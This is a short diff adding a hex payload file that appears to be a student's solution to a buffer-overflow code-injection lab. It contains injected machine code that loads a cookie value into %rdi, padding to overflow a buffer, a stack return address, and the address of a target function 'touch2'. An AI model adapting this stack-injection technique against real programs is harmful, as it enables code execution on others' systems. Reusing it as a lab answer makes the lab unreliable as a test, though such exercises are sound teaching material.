@@ -1,0 +1,10 @@
+48 c7 c7 dd d2 3c 78 00 /* Injected code; mov 0x783cd2dd, %rdi */
+00 00 00 00 00 00 00 00 /* Overflow */
+00 00 00 00 00 00 00 00
+e8 88 67 55 00 00 00 00 /* address of injected code (found through looking at %rsp after allocating for getbuf) (0x556788e8) */
+e8 12 40 00 00 00 00 00 /* address of touch2 */
+
+
+
+
+
